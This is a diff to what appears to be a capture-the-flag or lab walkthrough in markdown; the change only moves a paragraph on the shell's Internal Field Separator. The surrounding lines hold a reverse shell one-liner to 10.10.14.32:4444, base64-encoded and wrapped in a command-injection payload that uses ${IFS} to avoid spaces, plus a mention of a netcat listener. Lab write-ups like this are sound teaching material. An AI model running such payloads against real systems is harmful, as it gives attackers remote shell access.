@@ -131,11 +131,12 @@ Payload - echo 'sh -i >& /dev/tcp/10.10.14.32/4444 0>&1' | base64
 
 Once we get the `base64` encoded text, we will make the main payload as - 
 
+The `Internal Field Separator (IFS)` is an important concept in Unix-like operating systems, especially when working with shell scripting and text processing. It's an environment variable that defines the delimiter used to split text strings into fields. The default value for the IFS is typically a space, tab, and newline character, but you can customize it to use different delimiters as needed.
+
 ```bash
 Payload - ;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzIvNDQ0NCAwPiYxCg=="|
           base64${IFS}-d|bash;
 ```
-The `Internal Field Separator (IFS)` is an important concept in Unix-like operating systems, especially when working with shell scripting and text processing. It's an environment variable that defines the delimiter used to split text strings into fields. The default value for the IFS is typically a space, tab, and newline character, but you can customize it to use different delimiters as needed.
 
 Before using this payload, let's start the netcat listener on port `4444`.
 
